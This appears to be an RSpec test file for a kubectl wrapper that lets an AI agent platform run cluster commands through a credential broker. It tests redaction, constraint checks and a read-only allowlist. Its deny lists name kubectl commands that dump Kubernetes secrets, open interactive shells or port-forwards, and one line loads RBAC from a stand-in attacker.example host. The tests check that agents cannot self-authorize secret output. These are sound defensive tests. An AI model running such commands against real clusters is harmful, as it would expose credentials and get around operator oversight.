require "rails_helper"

RSpec.describe K8sCluster::Kubectl do
  let(:user) { Factories.user }
  let(:repository) { Factories.repository(user: user) }
  let(:job) { Factories.job_with_run(user: user, repository: repository) }
  let(:run) { job.runs.first }
  let(:context) { McpToolContext.from_run(run) }
  let(:admin_context) { McpToolContext.new(surface: :admin, role: nil, user: user) }
  let(:chat_session) { ChatSession.create!(user: user, repository: repository) }
  let(:chat_context) { McpToolContext.from_chat_session(chat_session) }
  let(:kubeconfig) do
    <<~YAML
      apiVersion: v1
      kind: Config
      current-context: prod
      clusters:
      - name: prod
        cluster:
          server: https://k8s.example.com
      contexts:
      - name: prod
        context:
          cluster: prod
          user: deploy
      users:
      - name: deploy
        user:
          token: secret-token-123
    YAML
  end
  let(:runner) { double("kubectl runner") }

  def create_credential(**attrs)
    CredentialStore::Credential.create!({
      name: "prod-kubeconfig",
      credential_type: "k8s_cluster.kubeconfig",
      scope_type: "repository",
      scope_id: repository.id,
      created_by: user,
      owner_user: user,
      payload: kubeconfig,
      safe_metadata: { "cluster" => "prod", "context" => "prod", "host" => "k8s.example.com" },
      target_constraints: { "allowed_kube_contexts" => [ "prod" ] },
      allowed_surfaces: [ "workflow" ],
      allowed_tools: [ "k8s_cluster_kubectl" ],
      last_rotated_at: 1.hour.ago
    }.merge(attrs))
  end

  def register_cluster_for(credential, **attrs)
    Factories.kubernetes_cluster(**{
      credential_store_credential_id: credential.id,
      agentic_access_enabled: true,
      allow_writes: false
    }.merge(attrs))
  end

  around do |example|
    original = described_class.runner
    described_class.runner = runner
    example.run
  ensure
    described_class.runner = original
  end

  before do
    allow(K8sCluster).to receive(:enabled?).and_return(true)
    allow(CredentialStore).to receive(:enabled?).and_return(true)
  end

  it "executes kubectl through a temporary kubeconfig file and removes it" do
    credential = create_credential
    observed_kubeconfig_path = nil

    allow(runner).to receive(:call) do |env:, argv:, timeout:, max_output_bytes:|
      observed_kubeconfig_path = env.fetch("KUBECONFIG")

      expect(env.keys).to contain_exactly("KUBECONFIG", "PATH", "HOME")
      expect(File.stat(observed_kubeconfig_path).mode & 0o777).to eq(0o600)
      expect(File.read(observed_kubeconfig_path)).to eq(kubeconfig)
      expect(argv).to eq([ "kubectl", "--context", "prod", "--namespace", "default", "get", "pods" ])
      expect(timeout).to eq(K8sCluster::Kubectl::RUN_TIMEOUT_SECONDS)
      expect(max_output_bytes).to eq(K8sCluster::Kubectl::MAX_OUTPUT_BYTES)

      K8sCluster::KubectlRunner::Result.new(stdout: "pods\n", stderr: "", status: 0)
    end

    result = described_class.call(
      context: context,
      credential: credential.id,
      kube_context: "prod",
      namespace: "default",
      args: [ "get", "pods" ]
    )

    expect(result).to include(ok: true, status: 0)
    expect(result[:stdout]).to include(text: "pods\n", truncated: false)
    expect(result[:credential]).to include(credential_id: credential.id, credential_type: "k8s_cluster.kubeconfig")
    expect(result.inspect).not_to include("secret-token-123")
    expect(File.exist?(observed_kubeconfig_path)).to be(false)

    expect(CredentialStore::CredentialAccessEvent.last).to have_attributes(
      credential: credential,
      user: user,
      repository: repository,
      run: run,
      surface: "workflow",
      tool_name: "k8s_cluster_kubectl",
      action: "lease",
      result: "allowed"
    )
  end

  it "redacts stdout and stderr returned by kubectl" do
    credential = create_credential
    allow(runner).to receive(:call).and_return(
      K8sCluster::KubectlRunner::Result.new(stdout: "stdout secret-token-123", stderr: "stderr secret-token-123", status: 1)
    )

    result = described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "get", "pods" ])

    expect(result[:ok]).to be(false)
    expect(result[:stdout][:text]).to include(CredentialStore::Redaction::REDACTION)
    expect(result[:stderr][:text]).to include(CredentialStore::Redaction::REDACTION)
    expect(result.inspect).not_to include("secret-token-123")
  end

  it "cleans up the kubeconfig file when kubectl raises" do
    credential = create_credential
    observed_kubeconfig_path = nil

    allow(runner).to receive(:call) do |env:, **|
      observed_kubeconfig_path = env.fetch("KUBECONFIG")
      raise "kubectl printed secret-token-123"
    end

    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "get", "pods" ])
    }.to raise_error(CredentialStore::Broker::ExecutionError, /credential redacted/)
    expect(File.exist?(observed_kubeconfig_path)).to be(false)
  end

  it "denies revoked and expired credentials before invoking kubectl" do
    revoked = create_credential(revoked_at: Time.current)
    expired = create_credential(name: "expired-kubeconfig", expires_at: 1.minute.ago)
    allow(runner).to receive(:call)

    expect {
      described_class.call(context: context, credential: revoked.id, kube_context: "prod", args: [ "get", "pods" ])
    }.to raise_error(CredentialStore::Broker::Denied, /credential revoked/)
    expect {
      described_class.call(context: context, credential: expired.id, kube_context: "prod", args: [ "get", "pods" ])
    }.to raise_error(CredentialStore::Broker::Denied, /credential expired/)
    expect(runner).not_to have_received(:call)
  end

  it "denies kube context, cluster, and namespace constraint mismatches" do
    credential = create_credential
    allow(runner).to receive(:call)

    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "staging", args: [ "get", "pods" ])
    }.to raise_error(CredentialStore::Broker::Denied, /kube context not allowed/)
    expect(runner).not_to have_received(:call)

    unconstrained = create_credential(name: "metadata-only", target_constraints: {})
    expect {
      described_class.call(context: context, credential: unconstrained.id, kube_context: "staging", args: [ "get", "pods" ])
    }.to raise_error(CredentialStore::Broker::Denied, /credential context metadata does not match target/)

    constrained = create_credential(
      name: "cluster-namespace-constrained",
      safe_metadata: { "cluster" => "prod", "context" => "prod", "namespace" => "default" },
      target_constraints: {
        "allowed_kube_contexts" => [ "prod" ],
        "allowed_kube_clusters" => [ "prod" ],
        "allowed_kube_namespaces" => [ "default" ]
      }
    )
    expect {
      described_class.call(context: context, credential: constrained.id, kube_context: "prod", cluster: "staging", namespace: "default", args: [ "get", "pods" ])
    }.to raise_error(CredentialStore::Broker::Denied, /kube cluster not allowed/)
    expect {
      described_class.call(context: context, credential: constrained.id, kube_context: "prod", cluster: "prod", namespace: "kube-system", args: [ "get", "pods" ])
    }.to raise_error(CredentialStore::Broker::Denied, /kube namespace not allowed/)
  end

  it "denies commands likely to expose secret values" do
    credential = create_credential
    allow(runner).to receive(:call)

    [
      [ "get", "secrets", "-o", "yaml" ],
      [ "get", "secrets/db-password", "-o", "yaml" ],
      [ "get", "secret,configmap", "-o", "json" ],
      [ "get", "configmap,secret.v1/db-password", "-o", "json" ],
      [ "get", "secret", "db", "-o", "custom-columns=D:.data" ],
      [ "get", "secret", "db", "--output=custom-columns-file=columns.txt" ],
      [ "get", "secret", "db", "-v=8" ],
      [ "get", "secret", "db", "-o", "name", "-v8" ],
      [ "get", "secret", "db", "--v", "6", "-o", "name" ],
      [ "get", "secret", "db", "-o", "name", "-o", "yaml" ],
      [ "get", "secret", "db" ],
      [ "get", "secrets", "-o=jsonpath={.data.token}" ],
      [ "get", "secrets", "--output=jsonpath={.data.token}" ],
      [ "get", "secrets", "-oyaml" ],
      [ "get", "secret", "prod-token", "-o", "custom-columns=TOKEN:.data.token" ],
      [ "get", "secret", "prod-token", "-ocustom-columns=TOKEN:.data.token" ],
      [ "get", "secret", "prod-token", "--output=custom-columns-file=columns.txt" ],
      [ "get", "--raw", "/api/v1/namespaces/default/secrets/prod-token" ],
      [ "get", "--raw=/api/v1/namespaces/default/secrets/prod-token?watch=false" ],
      [ "describe", "secret", "prod-token" ]
    ].each do |args|
      expect {
        described_class.call(context: context, credential: credential.id, kube_context: "prod", args: args)
      }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /expose secret values/)
    end
    expect(runner).not_to have_received(:call)
  end

  it "allows name-only Secret reads without secret-output allowance" do
    credential = create_credential
    allow(runner).to receive(:call).and_return(K8sCluster::KubectlRunner::Result.new(stdout: "secret/db\n", stderr: "", status: 0))

    result = described_class.call(
      context: context,
      credential: credential.id,
      kube_context: "prod",
      args: [ "get", "secrets/db", "-o", "name" ]
    )

    expect(result[:ok]).to be(true)
    expect(runner).to have_received(:call)
  end

  it "allows raw secret API paths only with operator secret-output allowance" do
    credential = create_credential(scope_type: "instance", scope_id: nil, allowed_surfaces: [ "admin" ])
    allow(runner).to receive(:call).and_return(K8sCluster::KubectlRunner::Result.new(stdout: "secret\n", stderr: "", status: 0))

    result = described_class.call(
      context: admin_context,
      credential: credential.id,
      kube_context: "prod",
      args: [ "get", "--raw", "/api/v1/namespaces/default/secrets/prod-token" ],
      allow_secret_output: true
    )

    expect(result[:ok]).to be(true)
    expect(runner).to have_received(:call).with(hash_including(argv: [ "kubectl", "--context", "prod", "get", "--raw", "/api/v1/namespaces/default/secrets/prod-token" ]))
  end

  it "does not let leading global flags bypass command policy" do
    credential = create_credential
    allow(runner).to receive(:call)

    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "--request-timeout=5s", "delete", "pod", "web" ])
    }.to raise_error(K8sCluster::Kubectl::InvalidCommand, /global flags/)
    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "--request-timeout=5s", "get", "secrets", "-o", "yaml" ])
    }.to raise_error(K8sCluster::Kubectl::InvalidCommand, /global flags/)
    expect(runner).not_to have_received(:call)
  end

  it "denies streaming and interactive commands before invoking kubectl" do
    credential = create_credential
    allow(runner).to receive(:call)

    [
      [ "get", "pods", "--watch" ],
      [ "get", "pods", "-w" ],
      [ "get", "pods", "-w=true" ],
      [ "get", "pods", "--watch-only" ],
      [ "get", "pods", "--watch-only=true" ],
      [ "logs", "web", "-f" ],
      [ "proxy" ],
      [ "port-forward", "pod/web", "8080:80" ],
      [ "exec", "-it", "web", "--", "sh" ]
    ].each do |args|
      expect {
        described_class.call(context: context, credential: credential.id, kube_context: "prod", args: args, allow_risky_command: true)
      }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /streaming or interactive|read-only allowlist/)
    end
    expect(runner).not_to have_received(:call)
  end

  it "rejects mutating commands even when risky-command allowance is supplied" do
    credential = create_credential

    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "apply", "-f", "deployment.yaml" ])
    }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /read-only allowlist/)
  end

  it "allows only read-only auth subcommands and rejects arbitrary kubectl plugins" do
    credential = create_credential
    allow(runner).to receive(:call).and_return(K8sCluster::KubectlRunner::Result.new(stdout: "yes\n", stderr: "", status: 0))

    expect(described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "auth", "can-i", "get", "pods" ])[:ok]).to be(true)
    expect(described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "auth", "whoami" ])[:ok]).to be(true)

    [ [ "auth", "reconcile", "-f", "https://attacker.example/rbac.yaml" ], [ "credential-stealer" ] ].each do |args|
      expect {
        described_class.call(context: context, credential: credential.id, kube_context: "prod", args: args, allow_risky_command: true)
      }.to raise_error(K8sCluster::Kubectl::RiskyCommand, /read-only allowlist/)
    end
  end

  it "does not let chat or workflow callers self-authorize secret output" do
    credential = create_credential(allowed_surfaces: [ "chat" ])

    expect {
      described_class.call(
        context: chat_context,
        credential: credential.id,
        kube_context: "prod",
        args: [ "get", "secrets", "-o", "yaml" ],
        allow_secret_output: true
      )
    }.to raise_error(K8sCluster::Kubectl::OperatorConfirmationRequired, /secret output/)

    expect {
      described_class.call(
        context: chat_context,
        credential: credential.id,
        kube_context: "prod",
        args: [ "get", "--raw", "/api/v1/namespaces/default/secrets/prod-token" ],
        allow_secret_output: true
      )
    }.to raise_error(K8sCluster::Kubectl::OperatorConfirmationRequired, /secret output/)

    workflow_credential = create_credential(name: "workflow-kubeconfig")
    expect {
      described_class.call(
        context: context,
        credential: workflow_credential.id,
        kube_context: "prod",
        args: [ "get", "secrets", "-o", "yaml" ],
        allow_secret_output: true
      )
    }.to raise_error(K8sCluster::Kubectl::OperatorConfirmationRequired, /secret output/)
  end

  it "enforces registered cluster agentic access before invoking kubectl" do
    credential = create_credential
    register_cluster_for(credential, agentic_access_enabled: false)
    allow(runner).to receive(:call)

    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "get", "pods" ])
    }.to raise_error(CredentialStore::Broker::Denied, /agentic access is disabled/)
    expect(runner).not_to have_received(:call)
  end

  it "rejects kubeconfig, context, and namespace flags in kubectl args" do
    credential = create_credential
    allow(runner).to receive(:call)

    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "get", "pods", "--kubeconfig=/tmp/config" ])
    }.to raise_error(K8sCluster::Kubectl::InvalidCommand, /credential flags/)
    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "--context", "staging", "get", "pods" ])
    }.to raise_error(K8sCluster::Kubectl::InvalidCommand, /global flags/)
    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "get", "pods", "-n", "prod" ])
    }.to raise_error(K8sCluster::Kubectl::InvalidCommand, /namespace/)
    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", namespace: "default", args: [ "get", "pods", "-nprod" ])
    }.to raise_error(K8sCluster::Kubectl::InvalidCommand, /namespace/)
    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", namespace: "default", args: [ "get", "pods", "-n=prod" ])
    }.to raise_error(K8sCluster::Kubectl::InvalidCommand, /namespace/)

    expect(runner).not_to have_received(:call)
  end

  it "rejects attached namespace overrides before requesting credential leases" do
    credential = create_credential(
      safe_metadata: { "cluster" => "prod", "context" => "prod", "namespace" => "default" },
      target_constraints: {
        "allowed_kube_contexts" => [ "prod" ],
        "allowed_kube_namespaces" => [ "default" ]
      }
    )
    allow(runner).to receive(:call)

    access_event_count = CredentialStore::CredentialAccessEvent.count
    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", namespace: "default", args: [ "get", "pods", "-nprod" ])
    }.to raise_error(K8sCluster::Kubectl::InvalidCommand, /namespace/)
    expect(CredentialStore::CredentialAccessEvent.count).to eq(access_event_count)
    expect(runner).not_to have_received(:call)
  end

  it "requires enabled k8s_cluster and credential_store plugins" do
    credential = create_credential

    allow(K8sCluster).to receive(:enabled?).and_return(false)
    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "get", "pods" ])
    }.to raise_error(K8sCluster::Kubectl::PluginDisabled)

    allow(K8sCluster).to receive(:enabled?).and_return(true)
    allow(CredentialStore).to receive(:enabled?).and_return(false)
    expect {
      described_class.call(context: context, credential: credential.id, kube_context: "prod", args: [ "get", "pods" ])
    }.to raise_error(K8sCluster::Kubectl::PluginDependencyDisabled)
  end
end

RSpec.describe K8sCluster::KubectlRunner do
  it "terminates kubectl processes that exceed the timeout" do
    result = described_class.call(env: {}, argv: [ RbConfig.ruby, "-e", "sleep 5" ], timeout: 0.1)

    expect(result).not_to be_success
    expect(result.stderr).to include("timed out")
  end

  it "replaces the inherited environment with the explicit kubectl environment" do
    result = described_class.call(
      env: { "KUBECONFIG" => "/tmp/config", "PATH" => ENV.fetch("PATH"), "HOME" => "/tmp" },
      argv: [ RbConfig.ruby, "-e", 'print [ENV["KUBECONFIG"], ENV["HOME"], ENV["RAILS_ENV"]].inspect' ]
    )

    expect(result.stdout).to eq('["/tmp/config", "/tmp", nil]')
  end

  it "drains command output while retaining only the configured byte limit" do
    result = described_class.call(
      env: {},
      argv: [ RbConfig.ruby, "-e", '$stdout.write("o" * 100_000); $stderr.write("e" * 100_000)' ],
      max_output_bytes: 1.kilobyte
    )

    expect(result).to be_success
    expect(result.stdout.bytesize).to eq(1.kilobyte + 1)
    expect(result.stderr.bytesize).to eq(1.kilobyte + 1)
  end
end
